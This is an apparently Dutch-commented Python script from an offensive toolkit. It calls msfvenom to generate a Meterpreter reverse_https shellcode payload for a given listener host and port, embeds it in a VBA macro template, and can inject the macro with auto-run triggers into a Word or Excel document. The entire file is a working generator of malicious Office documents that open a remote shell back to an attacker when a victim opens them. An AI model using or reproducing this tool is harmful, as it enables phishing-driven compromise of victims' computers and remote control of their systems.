#!/usr/bin/python3

# structure kept from methollow.py
# limited to csharp only
# default lport= 443
# writes out vbmacro

from meuk.hacksec import *
from meuk.vba_inject import inject_macro, detect_doc_type, _get_triggers

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use",  nargs='?', default="443")
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/meterpreter/reverse_https)", nargs='?', default="windows/meterpreter/reverse_https")
parser.add_argument("--template", help="pad naar een .docx of .xlsx template om de macro in te injecteren")
parser.add_argument("-o", "--output", help="output pad voor het macro-enabled document (standaard: .docm/.xlsm)")
args = parser.parse_args()

# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "vbapplication"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if result.returncode != 0:
    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful (rc={result.returncode}). Are you sure msfvenom is installed?{bcolors.ENDC}")

template=lezen('meuk/template/officemacro')

payload = result.stdout

#create the payload
macro = template.replace('[payloadreplace]', payload.decode('utf-8'))

if args.template:
    # Injecteer macro in Office document
    doc_type = detect_doc_type(args.template)
    triggers = _get_triggers(doc_type)
    macro_with_triggers = macro + triggers

    out = inject_macro(args.template, macro_with_triggers, args.output)
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Macro geïnjecteerd in: {out}{bcolors.ENDC}")
else:
    #create the file with raw ouput
    schrijven('http/payloads/office_macro.txt', macro)
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Macro geschreven naar: http/payloads/office_macro.txt{bcolors.ENDC}")
